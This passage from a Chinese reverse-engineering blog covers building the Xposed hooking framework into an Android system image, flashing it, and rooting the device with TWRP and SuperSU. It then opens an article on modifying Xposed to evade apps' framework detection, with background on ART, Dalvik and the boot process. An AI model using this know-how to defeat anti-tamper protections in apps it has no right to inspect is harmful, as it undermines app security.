href=\"https://github.com/rovo89/XposedInstaller\">XposedInstaller</a></p>\n<h4 id=\"（2）源码编译\"><a href=\"#（2）源码编译\" class=\"headerlink\" title=\"（2）源码编译\"></a>（2）源码编译</h4><p>我们直接通过Android Studio打开源码，进行环境配置，然后开始编译，生成XposedInstaller.apk即可</p>\n<h3 id=\"7-源码编译\"><a href=\"#7-源码编译\" class=\"headerlink\" title=\"7.源码编译\"></a>7.源码编译</h3><h4 id=\"（1）替换\"><a href=\"#（1）替换\" class=\"headerlink\" title=\"（1）替换\"></a>（1）替换</h4><p>用编译生成的bin文件夹中文件替换&#x2F;out&#x2F;target&#x2F;product&#x2F;hammerhead&#x2F;system&#x2F;文件夹下的bin文件夹中文件，进入bin文件夹下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cp /home/tom/SourceCode/XposedBridge/sdk23/arm/files/system/bin/* .</span><br></pre></td></tr></table></figure>\n\n<p>注意的是用xposed编译生成的app_process32_xposed替换system&#x2F;bin文件夹下的app_process32</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/27.png\" alt=\"image-20211001192053735\"></p>\n<p>用编译生成的lib文件夹中文件替换&#x2F;out&#x2F;target&#x2F;product&#x2F;hammerhead&#x2F;system&#x2F;文件夹下的lib文件夹中文件，我们进入lib文件夹下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cp /home/tom/SourceCode/XposedBridge/sdk23/arm/files/system/lib/* .</span><br></pre></td></tr></table></figure>\n\n<p>在&#x2F;out&#x2F;target&#x2F;product&#x2F;hammerhead&#x2F;system&#x2F;文件夹下加入编译生成的xposed.prop，我们进入system文件夹下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">cp /home/tom/SourceCode/XposedBridge/sdk23/arm/files/system/xppsed.prop  .</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/28.png\" alt=\"image-20211001192053735\"></p>\n<h4 id=\"（2）重新生成镜像文件\"><a href=\"#（2）重新生成镜像文件\" class=\"headerlink\" title=\"（2）重新生成镜像文件\"></a>（2）重新生成镜像文件</h4><p>我们进入android源码的根目录下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">source build/envsetup.sh</span><br><span class=\"line\">lunch 19</span><br><span class=\"line\">make snod  //make snod命令的作用是重新生成镜像文件system.img</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/29.png\" alt=\"image-20211001192519764\"></p>\n<h4 id=\"（3）刷机\"><a href=\"#（3）刷机\" class=\"headerlink\" title=\"（3）刷机\"></a>（3）刷机</h4><p>然后我们只需要将system.img镜像刷入即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">fastboot flash system system.img</span><br></pre></td></tr></table></figure>\n\n<p>然后我们需要获取root权限</p>\n<p>我们先刷入twrp:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">fastboot flash recovery twrp-2.8.7.1-hammerhead.img </span><br></pre></td></tr></table></figure>\n\n<p>然后我们将SuperSU推送到手机中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb push SR5-SuperSU-v2.82-SR5-20171001224502.zip /sdcard</span><br></pre></td></tr></table></figure>\n\n<p>然后我们进入recovery模式：</p>\n<p>将SuperSU刷入，直接通过进行刷入即可，这样手机就获得root权限了，然后重启手机</p>\n<h3 id=\"8-结果与测试\"><a href=\"#8-结果与测试\" class=\"headerlink\" title=\"8.结果与测试\"></a>8.结果与测试</h3><h4 id=\"（1）结果\"><a href=\"#（1）结果\" class=\"headerlink\" title=\"（1）结果\"></a>（1）结果</h4><p>我们打开手机，并输入命令抓取日志：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb logcat | grep -i xposed</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/30.png\" alt=\"image-20211001192519764\"></p>\n<p>这是我们还没有安装XposedInstall.apk，然后我们安装上XposedInstaller.apk，然后重启</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/32.png\" alt=\"image-20211001192519764\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/31.png\" alt=\"image-20211001192519764\"></p>\n<p>我们就可以发现Xposed框架成功激活</p>\n<h4 id=\"（2）测试\"><a href=\"#（2）测试\" class=\"headerlink\" title=\"（2）测试\"></a>（2）测试</h4><p>我们导入模块来测试我们的Xposed框架是否能使用</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/33.png\" alt=\"image-20211001192519764\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/34.png\" alt=\"image-20211001192519764\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/35.png\" alt=\"image-20211001192519764\"></p>\n<p>经过测试我们编译的Xposed框架是可以正常使用的</p>\n<h3 id=\"9-错误解决\"><a href=\"#9-错误解决\" class=\"headerlink\" title=\"9.错误解决\"></a>9.错误解决</h3><h4 id=\"（1）错误1\"><a href=\"#（1）错误1\" class=\"headerlink\" title=\"（1）错误1\"></a>（1）错误1</h4><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/37.png\" alt=\"image-20211001192519764\"></p>\n<p>问题分析：</p>\n<p>这是在使用mmm直接编译模块时，Android.mk文件编写错误，导致没有打包<code>de.robv.android.xposed.XposedBridge</code>该类</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/38.png\" alt=\"image-20211001192519764\"></p>\n<p>问题解决：</p>\n<p>这里我们应该在Android.mk中注意编写导入文件，更加推荐使用AndroidStudio直接编译，这样出错概率较少</p>\n<h4 id=\"（2）错误2\"><a href=\"#（2）错误2\" class=\"headerlink\" title=\"（2）错误2\"></a>（2）错误2</h4><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/39.png\" alt=\"image-20211001192519764\"></p>\n<p>问题分析：</p>\n<p>这里是因为我们下载的Xposed首字母大写</p>\n<p>问题解决：</p>\n<p>我们需要注意大小写问题</p>\n<h4 id=\"（3）错误3\"><a href=\"#（3）错误3\" class=\"headerlink\" title=\"（3）错误3\"></a>（3）错误3</h4><p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/40.png\" alt=\"image-20211001192519764\"></p>\n<p>问题分析：</p>\n<p>这是由于XposedBridge版本和XposedInstaller版本不一致导致的，我们进入源码发现该XposedBridge中函数并不包含此类，我们需要选择更高版本的源码</p>\n<p>问题解决：</p>\n<p>此类问题注意XposedBridge和XposedInstaller版本不一致的问题，需要采用合适的Xposed版本源码</p>\n<h2 id=\"三、实验总结\"><a href=\"#三、实验总结\" class=\"headerlink\" title=\"三、实验总结\"></a>三、实验总结</h2><p>在Xposed源码编译过程中，出现了很多的问题，但是大部分问题通过查找对应的错误，分析源码基本都可以解决，其中很多问题大部分是由于你下载的XposedBridge源码和XposedInstaller源码不匹配引起的，而还有一部分原因是因为你生的XposedBridge.jar错误引起的，在我们激活Xposed框架时，我们最好使用<code>adb logcat | grep &quot;xposed&quot;</code>来观察运行的情况，很多错误的操作可能导致Xposed框架不能正常的激活，从而导致手机死机，启动不了，这个时候我们可以进入recovery模式，wipe清除数据，这里实际上是清除XposedInstaller.apk，使得xposed不会被激活，手机就可以正常的进入，但是我们还是要通过日志信息分析原因，只要找到问题，重新编译源码，我们就可以正常启动了</p>\n<p>实验所用的文件资料，后续都会上传到github上：<a href=\"https://github.com/guoxuaa/Android-reverse/tree/main/Android%E6%BA%90%E7%A0%81%E5%AE%9A%E5%88%B6\">github地址</a></p>\n<h2 id=\"四、参考文献\"><a href=\"#四、参考文献\" class=\"headerlink\" title=\"四、参考文献\"></a>四、参考文献</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//www.jianshu.com/p/6471bab49cb1</span></span><br><span class=\"line\">https:<span class=\"comment\">//juejin.cn/post/6844903711714574344</span></span><br><span class=\"line\">https:<span class=\"comment\">//juejin.cn/post/6844903709730668551</span></span><br><span class=\"line\">https:<span class=\"comment\">//v2as.com/article/490aeab6-c2e2-4e28-a341-457ede3d7711</span></span><br><span class=\"line\">https:<span class=\"comment\">//www.hellojava.com/a/78058.html</span></span><br><span class=\"line\">https:<span class=\"comment\">//flysands.github.io/blog/2017-12-25-%E7%BC%96%E8%AF%91xposed%E6%BA%90%E7%A0%81.html</span></span><br><span class=\"line\">https:<span class=\"comment\">//mp.weixin.qq.com/s/c97zoTxRrEeYLvD8YwIUVQ</span></span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["Android源码定制"],"tags":["逆向技术","Xposed"]},{"title":"Android源码定制（4）——Xposed源码定制","url":"/2022/12/04/code4/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>在上篇文章<a href=\"https://bbs.pediy.com/thread-269616.htm\">源码编译（2）——Xopsed源码编译详解</a>中详细介绍了Xposed源码编译的完整过程，本文将从Android编译过程到Xposed运行机制，最后进行Xposed框架的详细定制。其中Xposed的定制主要参考世界美景大佬的<a href=\"https://bbs.pediy.com/thread-255836.htm\">定制Xposed框架</a>和肉丝大佬的<a href=\"https://mp.weixin.qq.com/s/YAMCrQSi0LFJGNIwB9qHDA\">来自高纬的对抗：魔改XPOSED过框架检测(下)</a>。</p>\n<span id=\"more\"></span>\n<p><strong>致谢：</strong></p>\n<p>首先感谢世界美景大佬的<a href=\"https://bbs.pediy.com/thread-255836.htm\">定制Xposed框架</a>，从里面学习到对Xposed框架特征的修改，但是由于个人水平有限，大佬的贴子不够详细，不能完整复现，经过搜索发现肉丝大佬的基于此的两篇详细的贴子讲解：<a href=\"https://mp.weixin.qq.com/s/c97zoTxRrEeYLvD8YwIUVQ\">来自高纬的对抗：魔改XPOSED过框架检测(上)</a>和<a href=\"https://mp.weixin.qq.com/s/YAMCrQSi0LFJGNIwB9qHDA\">来自高纬的对抗：魔改XPOSED过框架检测(下)</a>，本文的Android系统运行参考<a href=\"https://www.kancloud.cn/alex_wsc/androids/472168\">老罗的博客</a></p>\n<h2 id=\"二、Android运行机制\"><a href=\"#二、Android运行机制\" class=\"headerlink\" title=\"二、Android运行机制\"></a>二、Android运行机制</h2><p>我们在了解Xposed的运行机制前，不得不需要了解Android系统的基本结构和运行机制，这样我们才能进一步学习如何进行Xposed定制，才能减少更多的错误</p>\n<h3 id=\"1-Android平台架构\"><a href=\"#1-Android平台架构\" class=\"headerlink\" title=\"1. Android平台架构\"></a>1. Android平台架构</h3><p>Android的平台架构如下图所示：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/1.png\" alt=\"image-20211002145934512\"></p>\n<p>下面我们依次介绍各层之间的功能和作用：</p>\n<h4 id=\"（1）Linux内核\"><a href=\"#（1）Linux内核\" class=\"headerlink\" title=\"（1）Linux内核\"></a>（1）Linux内核</h4><p>Android平台的基础是linux内核，Android Runtime（ART）依靠Linux内核来执行底层功能，使用Linux内核可让Android利用主要安全功能，并且运行设备制造商为著名的内核开发硬件驱动程序，可以理解基于linux内核让Android更安全并且可以拥有很多设备驱动</p>\n<h4 id=\"（2）硬件抽象层（HAL）\"><a href=\"#（2）硬件抽象层（HAL）\" class=\"headerlink\" title=\"（2）硬件抽象层（HAL）\"></a>（2）硬件抽象层（HAL）</h4><p>HAL提供标准界面，向更高级别Java API框架显示设备硬件功能，HAL包含多个模块，其中每个模块都为特定类型的硬件组件实现一个界面，例如相机和蓝牙模块，当框架API要访问设备硬件时，Android系统为该硬件组件加载库模块。</p>\n<h4 id=\"（3）Android-Runtime\"><a href=\"#（3）Android-Runtime\" class=\"headerlink\" title=\"（3）Android Runtime\"></a>（3）Android Runtime</h4><p>Android 5.0之前Android Runtime为Dalvik，Android 5.0之后Android Runtime为ART</p>\n<p>首先我们先了解一些文件的含义：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）dex文件：Android将所有的class文件打包形成一个dex文件，是Dalvik运行的程序</span><br><span class=\"line\">（<span class=\"number\">2</span>）odex文件：优化过的dex文件，Apk在安装时会进行验证和优化，通过dexopt生成odex文件，加快Apk的响应时间</span><br><span class=\"line\">（<span class=\"number\">3</span>）oat文件：Android私有ELF文件格式，有dex2oat处理生成，包含（原dex文件+dex翻译的本地机器指令），是ART虚拟机使用的文件，可以直接加载</span><br><span class=\"line\">（<span class=\"number\">4</span>）vdex文件：Android <span class=\"number\">8.0</span>引入，包含APK的未压缩DEX代码，以及一些旨在加快验证速度的元数据</span><br></pre></td></tr></table></figure>\n\n<p>下面我们从Android系统的发展过程中详细介绍二者的区别：</p>\n<table>\n<thead>\n<tr>\n<th>版本</th>\n<th>虚拟机类型</th>\n<th>特性</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>2.1-4.4</td>\n<td>Dalvik</td>\n<td>JIT+解释器</td>\n</tr>\n<tr>\n<td>5.0-7.0</td>\n<td>ART</td>\n<td>AOT</td>\n</tr>\n<tr>\n<td>7.0-11</td>\n<td>ART</td>\n<td>AOT+JIT+解释器</td>\n</tr>\n</tbody></table>\n<p>下面部分参考博客：<a href=\"https://juejin.cn/post/6844903748058218509\">博客地址</a></p>\n<p><strong>Android 2.2</strong></p>\n<p><strong>Dalvik</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">支持已转换成dex格式的android应用，基于寄存器，指令执行更快，加载的是odex文件，采用JIT运行时编译</span><br></pre></td></tr></table></figure>\n\n<p><strong>JIT:</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">\tJIT即运行时编译策略，可以理解成一种运行时编译器，此时Android的虚拟机使用的是Dalvik，为了加快Dalvik虚拟机解释dex速度，运行时动态地将执行频率很高的dex字节码翻译成本地机器码</span><br><span class=\"line\">缺点：</span><br><span class=\"line\">\t（1）每次启动应用都需要重新编译</span><br><span class=\"line\">\t（2）运行时比较耗电，造成电池额外的开销</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/2.png\" alt=\"image-20211002145934512\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/4.png\" alt=\"image-20211003100041210\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">\t基于Dalvik的虚拟机，在APK安装时会对dex文件进行优化，产生odex文件，然后在启动APP后，运行时会利用JIT即时编译，处理执行频率高的一部分dex，将其翻译成机器码，这样在再次调用的时候就可以直接运行机器码，从而提高了Dalvik翻译的速率，提高运行速度</span><br><span class=\"line\">缺点：</span><br><span class=\"line\">\t（1）由于在Dex加载时会触发dexopt , 导致Multidex加载的时候会非常慢</span><br><span class=\"line\">\t（2）由于热点代码的Monitor一直在运行 , 解释器解释的字节码会带来CPU和时间的消耗, 会带来电量的损耗</span><br></pre></td></tr></table></figure>\n\n<p><strong>Android 4.4——ART和AOT</strong></p>\n<p>此时引入全新的虚拟机运行环境ART和全新的编译策略AOT，此时ART和Dalvik是共存的，用户可以在两者之间选择</p>\n<p><strong>Android 5.0——ART全面取代Dalvik</strong></p>\n<p>AOT:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">AOT是一种运行前编译的策略</span><br><span class=\"line\">缺点：</span><br><span class=\"line\">（<span class=\"number\">1</span>）应用安装和系统升级之后的应用优化比较耗时</span><br><span class=\"line\">（<span class=\"number\">2</span>）优化后的文件会占用额外的存储空间</span><br></pre></td></tr></table></figure>\n\n<p>AOT与JIT区别：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">JIT 是在运行时进行编译，是动态编译，并且每次运行程序的时候都需要对 odex 重新进行编译</span><br><span class=\"line\">AOT 是静态编译，应用在安装的时候会启动 dex2oat 过程把 dex 预编译成 ELF 文件，每次运行程序的时候不用重新编译，是真正意义上的本地应用</span><br></pre></td></tr></table></figure>\n\n<p>JVM、Dalvik和ART区别：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">JVM：传统的Java虚拟机、基于栈、运行class文件</span><br><span class=\"line\">Dalvik:支持已转换成dex格式的android应用，基于寄存器，指令执行更快,加载的是odex（优化的dex）</span><br><span class=\"line\">ART:第一次安装时，将dex进行Aot(预编译)，字节码预先编译成机器码，生成可执行oat文件（ELF文件）</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/3.png\" alt=\"image-20211002154534641\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/5.png\" alt=\"image-20211003101124310\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">\t基于ART的虚拟机，会在APK第一次安装时，将dex进行AOT(预编译)，通过dex2oat生成oat文件，即Android可执行ELF文件，包括原dex文件和翻译后的机器码，然后启动程序后，直接运行</span><br><span class=\"line\">缺点：</span><br><span class=\"line\">    （<span class=\"number\">1</span>）由于安装APK时触发dex2oat , 需要编译成<span class=\"keyword\">native</span> code , 导致安装时间过长</span><br><span class=\"line\">    （<span class=\"number\">2</span>）由于dex2oat生成的文件较大 , 会占用较多的空间</span><br></pre></td></tr></table></figure>\n\n<p><strong>Android 7.0——JIT回归</strong></p>\n<p>考虑上面AOT的缺点，dex2oat过程比较耗时且会占用额外的存储空间，Android 7.0 再次加入JIT形成<code>AOT+JIT+解释器</code>模式</p>\n<p>特点：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）应用在安装的时候 dex 不会被编译</span><br><span class=\"line\">（2）应用在运行时 dex 文件先通过解析器（Interpreter）后会被直接执行，与此同时，热点函数（Hot Code）会被识别并被 JIT 编译后存储在 jit code cache 中并生成 profile 文件以记录热点函数的信息</span><br><span class=\"line\">（3）手机进入 IDLE（空闲） 或者 Charging（充电） 状态的时候，系统会扫描 App 目录下的 profile 文件并执行 AOT 过程进行编译</span><br></pre></td></tr></table></figure>\n\n<p>混合编译模式综合了 AOT 和 JIT 的各种优点，使得应用在安装速度加快的同时，运行速度、存储空间和耗电量等指标都得到了优化</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/6.png\" alt=\"image-20211003102555392\"></p>\n<p>最后我们可以看下Android各版本ClassLoader加载dex时的dexopt过程：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/7.png\" alt=\"image-20211003102844820\"></p>\n<h4 id=\"（4）原生C-x2F-C-库\"><a href=\"#（4）原生C-x2F-C-库\" class=\"headerlink\" title=\"（4）原生C&#x2F;C++库\"></a>（4）原生C&#x2F;C++库</h4><p>许多核心 Android 系统组件和服务（例如 ART 和 HAL）构建自原生代码，需要以 C 和 C++ 编写的原生库。Android 平台提供 Java 框架 API 以向应用显示其中部分原生库的功能，我们可以通过NDK开发Android中的C&#x2F;C++库</p>\n<h4 id=\"（5）Java-API框架\"><a href=\"#（5）Java-API框架\" class=\"headerlink\" title=\"（5）Java API框架\"></a>（5）Java API框架</h4><p>通过以 Java 语言编写的 API 使用 Android OS 的整个功能集。这些 API 形成创建 Android 应用所需的构建块，它们可简化核心模块化系统组件和服务的重复使用，包括以下组件和服务</p>\n<h3 id=\"2-Android启动流程\"><a href=\"#2-Android启动流程\" class=\"headerlink\" title=\"2. Android启动流程\"></a>2. Android启动流程</h3><p>Android启动流程如下图所示：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/8.png\" alt=\"image-20211003102844820\"></p>\n<h4 id=\"（1）Loader\"><a href=\"#（1）Loader\" class=\"headerlink\" title=\"（1）Loader\"></a>（1）Loader</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Boot ROM: 当手机处于关机状态时，长按Power键开机，引导芯片开始从固化在ROM里的预设代码开始执行，然后加载引导程序到RAM</span><br><span class=\"line\">Boot Loader：这是启动Android系统之前的引导程序，主要是检查RAM，初始化硬件参数，拉起Android OS</span><br></pre></td></tr></table></figure>\n\n<p>我们长按电源键后，手机就会在Loader层加载引导程序，并启动引导程序，初始化参数</p>\n<h4 id=\"（2）Linux内核\"><a href=\"#（2）Linux内核\" class=\"headerlink\" title=\"（2）Linux内核\"></a>（2）Linux内核</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"number\">1</span>)启动Kernel的swapper进程(pid=<span class=\"number\">0</span>)：该进程又称为idle进程, 系统初始化过程Kernel由无到有开创的第一个进程, 用于初始化进程管理、内存管理，加载Display,Camera Driver，Binder Driver等相关工作，这些模块驱动都会封装到对应的HAL层中</span><br><span class=\"line\">(<span class=\"number\">2</span>)启动 init 进程（用户进程的祖宗）。pid = <span class=\"number\">1</span>，用来孵化用户空间的守护进程、HAL、开机动画等</span><br><span class=\"line\">(<span class=\"number\">3</span>)启动kthreadd进程（pid=<span class=\"number\">2</span>）：是Linux系统的内核进程，会创建内核工作线程kworkder，软中断线程ksoftirqd，thermal等内核守护进程。kthreadd进程是所有内核进程的鼻祖\t</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）执行init进程\"><a href=\"#（3）执行init进程\" class=\"headerlink\" title=\"（3）执行init进程\"></a>（3）执行init进程</h4><p>init 进程是Linux系统中用户空间的第一个进程，进程号为1，是所以用户进程的祖先</p>\n<p>Linux Kernel完成系统设置后，会首先在系统中寻找init.rc文件，并启动init进程，init.rc脚本存放路径：<code> /system/core/rootdir/init.rc</code> ，init进程：<code>/system/core/init </code></p>\n<p>init进程的启动可以分为三个部分：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）init进程会孵化出ueventd、logd、healthd、installd、adbd、lm这里写代码片kd等用户守护进程</span><br><span class=\"line\">（<span class=\"number\">2</span>）init进程还会启动ServiceManager(Binder服务管家)、bootanim(开机动画)等重要服务</span><br><span class=\"line\">（<span class=\"number\">3</span>）解析init.rc配置文件并孵化zygote进程,Zygote进程是Android系统的第一个java进程（虚拟机进程），zygote进程是所以Java进程的父进程</span><br></pre></td></tr></table></figure>\n\n<p>创建Zygote过程：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）解析 init.zygote.rc <span class=\"comment\">//parse_service() </span></span><br><span class=\"line\">（<span class=\"number\">2</span>）启动 main 类型服务 <span class=\"comment\">//do_class_start() </span></span><br><span class=\"line\">（<span class=\"number\">3</span>）启动 zygote 服务 <span class=\"comment\">//service_start() </span></span><br><span class=\"line\">（<span class=\"number\">4</span>）创建 Zygote 进程 <span class=\"comment\">//fork() </span></span><br><span class=\"line\">（<span class=\"number\">5</span>）创建 Zygote Socket <span class=\"comment\">//create_socket()</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（4）Zygote\"><a href=\"#（4）Zygote\" class=\"headerlink\" title=\"（4）Zygote\"></a>（4）Zygote</h4><p>Zygote为孵化器，即所有Android应用的祖先，Zygote 让 VM 共享代码、低内存占用以及最小的启动时间成为可能， Zygote 是一个虚拟机进程，Zygote是由init进程通过解析<code>init.zygote.rc</code>文件而创建的，zygote所对应的可执行程序<code>app_process</code>，所对应的源文件是<code>App_main.cpp</code>，进程名为zygote</p>\n<p>Zygote作用过程：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"number\">1</span>)解析init.zygote.rc中的参数，创建AppRuntime并调用AppRuntime.start()方法；</span><br><span class=\"line\">(<span class=\"number\">2</span>)调用AndroidRuntime的startVM()方法创建虚拟机，再调用startReg()注册JNI函数；</span><br><span class=\"line\">(<span class=\"number\">3</span>)通过JNI方式调用ZygoteInit.main()，第一次进入Java世界；</span><br><span class=\"line\">(<span class=\"number\">4</span>)registerZygoteSocket()建立socket通道，zygote作为通信的服务端，用于响应客户端请求；</span><br><span class=\"line\">(<span class=\"number\">5</span>)preload()预加载通用类、drawable和color资源、openGL以及共享库以及WebView，用于提高app启动效率；</span><br><span class=\"line\">(<span class=\"number\">6</span>)zygote完毕大部分工作，接下来再通过startSystemServer()，fork得力帮手system_server进程，也是上层framework的运行载体。</span><br><span class=\"line\">(<span class=\"number\">7</span>)zygote功成身退，调用runSelectLoop()（死循环），随时待命，当接收到请求创建新进程请求时立即唤醒并执行相应工作。</span><br></pre></td></tr></table></figure>\n\n<p>Android系统流程总结：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"number\">1</span>) 手机开机后，引导芯片启动，引导芯片开始从固化在ROM里的预设代码执行，加载引导程序到到RAM，BootLoader检查RAM，初始化硬件参数等功能；</span><br><span class=\"line\">(<span class=\"number\">2</span>) 硬件等参数初始化完成后，进入到Kernel层，Kernel层主要加载一些硬件设备驱动，初始化进程管理等操作。在Kernel中首先启动swapper进程（pid=<span class=\"number\">0</span>），用于初始化进程管理、内管管理、加载Driver等操作，再启动kthread进程(pid=<span class=\"number\">2</span>),这些linux系统的内核进程，kthread是所有内核进程的鼻祖；</span><br><span class=\"line\">(<span class=\"number\">3</span>) Kernel层加载完毕后，硬件设备驱动与HAL层进行交互。初始化进程管理等操作会启动init进程 ，这些在Native层中；</span><br><span class=\"line\">(<span class=\"number\">4</span>) init进程(pid=<span class=\"number\">1</span>，init进程是所有进程的鼻祖，第一个启动)启动后，会启动adbd，logd等用户守护进程，并且会启动servicemanager(binder服务管家)等重要服务，同时孵化出zygote进程，这里属于C++ Framework，代码为C++程序；</span><br><span class=\"line\">(<span class=\"number\">5</span>) zygote进程是由init进程解析init.rc文件后fork生成，它会加载虚拟机，启动System <span class=\"title function_\">Server</span><span class=\"params\">(zygote孵化的第一个进程)</span>；SystemServer负责启动和管理整个Java Framework，包含ActivityManager，WindowManager，PackageManager，PowerManager等服务；</span><br><span class=\"line\">(<span class=\"number\">6</span>) zygote同时会启动相关的APP进程，它启动的第一个APP进程为Launcher，然后启动Email，SMS等进程，所有的APP进程都有zygote fork生成。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、Xposed框架运行机制\"><a href=\"#三、Xposed框架运行机制\" class=\"headerlink\" title=\"三、Xposed框架运行机制\"></a>三、Xposed框架运行机制</h2><p>我们从上文中已经详细介绍了Android的启动流程，如下图所示：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/9.png\" alt=\"image-20211003102844820\"></p>\n<p>下面我们来详细介绍Xposed框架的实现原理：</p>\n<h3 id=\"1-Xposed实现原理\"><a href=\"#1-Xposed实现原理\" class=\"headerlink\" title=\"1.  Xposed实现原理\"></a>1.  Xposed实现原理</h3><p>我们先进入<a href=\"https://github.com/rovo89\">Xposed官网</a>，可以发现Xposed工程的5个文件夹：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/10.png\" alt=\"image-20211003120209903\"></p>\n<p>具体的模块功能和作用，我们在上文<a href=\"https://bbs.pediy.com/thread-269616.htm\">源码编译（2）——Xopsed源码编译详解</a>已经介绍了，大家可以去参考</p>\n<p>上文中我们知道，Xposed集成到Android源码中主要是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）替换了Android中的虚拟机art</span><br><span class=\"line\">（2）替换了app_process以及生成的一些lib，bin文件等</span><br></pre></td></tr></table></figure>\n\n<p>具体如下图所示</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/11.png\" alt=\"image-20211003120719433\"></p>\n<p>我们从上文中可以得知Android所有的用户进程都是通过Zygote孵化出来的，而Zygote的执行程序是app_process，安装Xposed，将app_process替换，然后替换对应的虚拟机，这样Zygote孵化器就变成了Xposed孵化器</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code4/12.png\" alt=\"image-20211003134604388\"></p>\n<p>我们先来分析一下替换后的<code>app_process</code>：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ifeq (<span class=\"number\">1</span>,$(strip $(shell expr $(PLATFORM_SDK_VERSION) \\&gt;= <span class=\"number\">21</span>)))</span><br><span class=\"line\">  LOCAL_SRC_FILES := app_main2.cpp</span><br><span class=\"line\">  LOCAL_MULTILIB := both</span><br><span class=\"line\">  LOCAL_MODULE_STEM_32 := app_process32_xposed</span><br><span class=\"line\">  LOCAL_MODULE_STEM_64 := app_process64_xposed</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">  LOCAL_SRC_FILES := app_main.cpp</span><br><span class=\"line\">  LOCAL_MODULE_STEM := app_process_xposed</span><br><span class=\"line\">endif</span><br><span class=\"line\">...</span><br><span class=\"line\">ifeq (<span class=\"number\">1</span>,$(strip $(shell expr $(PLATFORM_SDK_VERSION) \\&gt;= <span class=\"number\">21</span>)))</span><br><span class=\"line\">  include frameworks/base/cmds/xposed/ART.mk</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">  include frameworks/base/cmds/xposed/Dalvik.mk</span><br><span 